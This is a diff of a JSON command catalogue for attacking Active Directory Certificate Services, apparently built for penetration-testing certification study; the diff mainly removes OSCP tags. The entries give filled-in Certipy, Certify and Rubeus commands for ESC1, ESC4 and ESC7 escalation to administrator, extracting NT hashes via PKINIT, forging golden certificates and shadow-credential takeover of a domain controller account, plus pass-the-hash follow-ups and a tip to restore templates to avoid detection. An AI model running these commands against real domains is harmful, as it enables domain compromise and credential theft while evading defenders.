@@ -38,8 +38,7 @@
         "ADCS",
         "CERTIFICATE",
         "ENUMERATION",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-u": "Username in UPN format (user@domain)",
@@ -73,8 +72,7 @@
         "Connection refused": "Check DC IP and port 389/636 accessibility",
         "Invalid credentials": "Verify username format (user@domain) and password"
       },
-      "notes": "CERTIPY is the primary Linux tool for ADCS enumeration and exploitation.\n\nWHAT IT FINDS:\n- ESC1: Template allows requestor to supply Subject Alternative Name (SAN)\n- ESC2: Template has 'Any Purpose' EKU or no EKU\n- ESC3: Certificate Request Agent templates\n- ESC4: Vulnerable template ACLs (WriteDacl, WriteOwner, etc.)\n- ESC5: Vulnerable PKI object ACLs\n- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA\n- ESC7: ManageCA/ManageCertificates permissions\n- ESC8: HTTP enrollment with NTLM relay\n- ESC9-13: Various certificate binding weaknesses\n\nOSCP TIP:\nADCS is increasingly common in exams. ESC1 and ESC4 are most exploitable.",
-      "oscp_relevance": "high",
+      "notes": "CERTIPY is the primary Linux tool for ADCS enumeration and exploitation.\n\nWHAT IT FINDS:\n- ESC1: Template allows requestor to supply Subject Alternative Name (SAN)\n- ESC2: Template has 'Any Purpose' EKU or no EKU\n- ESC3: Certificate Request Agent templates\n- ESC4: Vulnerable template ACLs (WriteDacl, WriteOwner, etc.)\n- ESC5: Vulnerable PKI object ACLs\n- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA\n- ESC7: ManageCA/ManageCertificates permissions\n- ESC8: HTTP enrollment with NTLM relay\n- ESC9-13: Various certificate binding weaknesses\n\ncertification TIP:\nADCS is increasingly common in exams. ESC1 and ESC4 are most exploitable.",
       "filled_example": "certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 192.168.50.70 -vulnerable -stdout"
     },
     {
@@ -133,8 +131,7 @@
         "ESC1",
         "CERTIFICATE",
         "PRIVILEGE_ESCALATION",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-ca": "Certificate Authority name (from certipy find output)",
@@ -164,8 +161,7 @@
         "CERTSRV_E_TEMPLATE_DENIED": "User cannot enroll in this template - check ACLs",
         "Template not found": "Verify exact template name from certipy find"
       },
-      "notes": "ESC1 ATTACK:\nTemplates with 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' allow requestor to specify the Subject Alternative Name (SAN).\n\nThis means you can request a certificate for ANY user (including administrator@domain).\n\nATTACK FLOW:\n1. certipy find -vulnerable (identify ESC1 templates)\n2. certipy req -upn administrator@domain (request cert as admin)\n3. certipy auth -pfx admin.pfx (authenticate with cert to get NT hash)\n\nREQUIREMENTS:\n- Template must allow client authentication (EKU)\n- Attacker must have enrollment rights on template\n- CA must be accessible\n\nOSCP TIP:\nESC1 is the most common and easiest ADCS attack. Always check for it first.",
-      "oscp_relevance": "high",
+      "notes": "ESC1 ATTACK:\nTemplates with 'CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT' allow requestor to specify the Subject Alternative Name (SAN).\n\nThis means you can request a certificate for ANY user (including administrator@domain).\n\nATTACK FLOW:\n1. certipy find -vulnerable (identify ESC1 templates)\n2. certipy req -upn administrator@domain (request cert as admin)\n3. certipy auth -pfx admin.pfx (authenticate with cert to get NT hash)\n\nREQUIREMENTS:\n- Template must allow client authentication (EKU)\n- Attacker must have enrollment rights on template\n- CA must be accessible\n\ncertification TIP:\nESC1 is the most common and easiest ADCS attack. Always check for it first.",
       "filled_example": "certipy req -u 'user@corp.local' -p 'P@ssw0rd123!' -ca 'corp-CA' -target 'ca.corp.local' -template 'UserAuth' -upn 'administrator@corp.local'"
     },
     {
@@ -195,8 +191,7 @@
         "CERTIFICATE",
         "PKINIT",
         "AUTHENTICATION",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-pfx": "PFX certificate file containing cert and private key",
@@ -226,7 +221,6 @@
         "KDC_ERR_CLIENT_NOT_TRUSTED": "Certificate not trusted - check CA chain"
       },
       "notes": "PKINIT AUTHENTICATION:\nUses certificate to request TGT via Kerberos PKINIT.\n\nThe DC returns the user's NT hash encrypted with the session key.\n\nCertipy extracts this hash for pass-the-hash attacks.\n\nOUTPUT:\nReturns NT hash that can be used with:\n- Evil-WinRM: evil-winrm -i <target> -u <user> -H <hash>\n- PSExec: impacket-psexec <domain>/<user>@<target> -hashes :<hash>\n- CrackMapExec: cme smb <target> -u <user> -H <hash>",
-      "oscp_relevance": "high",
       "filled_example": "certipy auth -pfx 'administrator.pfx' -dc-ip 192.168.50.70"
     },
     {
@@ -267,8 +261,7 @@
         "ESC4",
         "CERTIFICATE",
         "PRIVILEGE_ESCALATION",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-template": "Template name to modify",
@@ -294,7 +287,6 @@
         "Access denied": "User does not have write access to template"
       },
       "notes": "ESC4 ATTACK:\nIf you have WriteDacl/WriteOwner/GenericAll on a certificate template, you can modify it to enable ESC1.\n\nATTACK FLOW:\n1. certipy template -save-old (backup original, enable ESC1 flags)\n2. certipy req -upn administrator@domain (request cert as admin)\n3. certipy template -configuration old.json (restore original template)\n4. certipy auth -pfx admin.pfx (use cert to get hash)\n\nALWAYS RESTORE:\nUse -save-old flag and restore template after attack to avoid detection.",
-      "oscp_relevance": "high",
       "filled_example": "certipy template -u 'user@corp.local' -p 'P@ssw0rd123!' -template 'UserAuth' -save-old"
     },
     {
@@ -335,8 +327,7 @@
         "ESC7",
         "CERTIFICATE",
         "PRIVILEGE_ESCALATION",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "-ca": "Target Certificate Authority name",
@@ -361,7 +352,6 @@
         "Access denied": "User does not have ManageCA rights"
       },
       "notes": "ESC7 ATTACK:\nManageCA permission allows modifying CA configuration.\n\nATTACK FLOW:\n1. Add yourself as certificate officer: certipy ca -add-officer\n2. Enable SubjectAltRequireUpn template: certipy ca -enable-template SubjectAltRequireUpn\n3. Request certificate with ESC1: certipy req -template SubjectAltRequireUpn\n4. Authenticate: certipy auth -pfx file.pfx\n\nALTERNATIVE:\nWith ManageCertificates, you can approve pending requests directly.",
-      "oscp_relevance": "high",
       "filled_example": "certipy ca -ca 'corp-CA' -add-officer 'user' -u 'user@corp.local' -p 'P@ssw0rd123!'"
     },
     {
@@ -409,8 +399,7 @@
         "GOLDEN_CERT",
         "CERTIFICATE",
         "PERSISTENCE",
-        "LINUX",
-        "OSCP:MEDIUM"
+        "LINUX"
       ],
       "flag_explanations": {
         "-ca-pfx": "CA private key in PFX format",
@@ -433,7 +422,6 @@
         "Invalid PFX": "CA private key file is corrupted or wrong format"
       },
       "notes": "GOLDEN CERTIFICATE:\nSimilar to Golden Ticket but uses CA private key instead of krbtgt hash.\n\nIf CA private key is compromised (via backup, DPAPI, etc.), you can forge certificates for ANY user.\n\nREQUIRES:\n- CA private key (obtained via backup theft, DPAPI, or CA server compromise)\n\nPERSISTENCE:\nGolden certs remain valid until CA key is rotated (rarely done).",
-      "oscp_relevance": "medium",
       "filled_example": "certipy forge -ca-pfx 'ca.pfx' -upn 'administrator@corp.local' -subject 'CN=administrator,CN=Users,DC=corp,DC=local'"
     },
     {
@@ -473,8 +461,7 @@
         "ADCS",
         "SHADOW_CREDENTIALS",
         "PRIVILEGE_ESCALATION",
-        "LINUX",
-        "OSCP:HIGH"
+        "LINUX"
       ],
       "flag_explanations": {
         "shadow": "Shadow credentials subcommand",
@@ -499,7 +486,6 @@
         "Access denied": "User lacks GenericWrite/GenericAll on target"
       },
       "notes": "SHADOW CREDENTIALS:\nAdds key credential link to target's msDS-KeyCredentialLink attribute.\n\nAllows certificate-based authentication as that account.\n\nREQUIRES:\n- GenericWrite/GenericAll/WriteProperty on target account\n- ADCS with working PKINIT\n\nUSE CASES:\n- Compromise computer accounts (DC01$)\n- Compromise service accounts\n- Lateral movement without password",
-      "oscp_relevance": "high",
       "filled_example": "certipy shadow auto -u 'user@corp.local' -p 'P@ssw0rd123!' -account 'DC01$'"
     },
     {
@@ -515,8 +501,7 @@
         "ADCS",
         "CERTIFICATE",
         "ENUMERATION",
-        "WINDOWS",
-        "OSCP:HIGH"
+        "WINDOWS"
       ],
       "flag_explanations": {
         "find": "Enumerate certificate templates and CAs",
@@ -543,8 +528,7 @@
       "troubleshooting": {
         "Access denied": "Run from domain-joined system with valid credentials"
       },
-      "notes": "CERTIFY is the Windows equivalent of Certipy.\n\nUse when:\n- You have Windows shell access\n- Certipy is blocked or unavailable\n- Need .NET-based execution\n\nOUTPUT:\nShows vulnerable templates with exploitation guidance.",
-      "oscp_relevance": "high"
+      "notes": "CERTIFY is the Windows equivalent of Certipy.\n\nUse when:\n- You have Windows shell access\n- Certipy is blocked or unavailable\n- Need .NET-based execution\n\nOUTPUT:\nShows vulnerable templates with exploitation guidance."
     },
     {
       "id": "certify-request",
@@ -578,8 +562,7 @@
         "ADCS",
         "CERTIFICATE",
         "EXPLOITATION",
-        "WINDOWS",
-        "OSCP:HIGH"
+        "WINDOWS"
       ],
       "flag_explanations": {
         "/ca": "Certificate Authority in format server\\CAname",
@@ -607,7 +590,6 @@
         "Access denied": "User cannot enroll in template"
       },
       "notes": "After getting certificate:\n1. Convert to PFX: openssl pkcs12 -in cert.pem -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out cert.pfx\n2. Use Rubeus: Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt",
-      "oscp_relevance": "high",
       "filled_example": "Certify.exe request /ca:ca.corp.local\\corp-CA /template:UserAuth /altname:administrator"
     },
     {
@@ -642,8 +624,7 @@
         "ADCS",
         "CERTIFICATE",
         "KERBEROS",
-        "WINDOWS",
-        "OSCP:HIGH"
+        "WINDOWS"
       ],
       "flag_explanations": {
         "/user": "Username to request TGT for",
@@ -673,7 +654,6 @@
         "KDC_ERR_PADATA_TYPE_NOSUPP": "PKINIT not enabled on DC"
       },
       "notes": "Windows equivalent of certipy auth.\n\nUse /ptt to inject ticket into current session for immediate use.\n\nWithout /ptt, outputs Base64 ticket for later injection.",
-      "oscp_relevance": "high",
       "filled_example": "Rubeus.exe asktgt /user:administrator /certificate:C:\\Temp\\admin.pfx /password:password123 /ptt"
     }
   ]
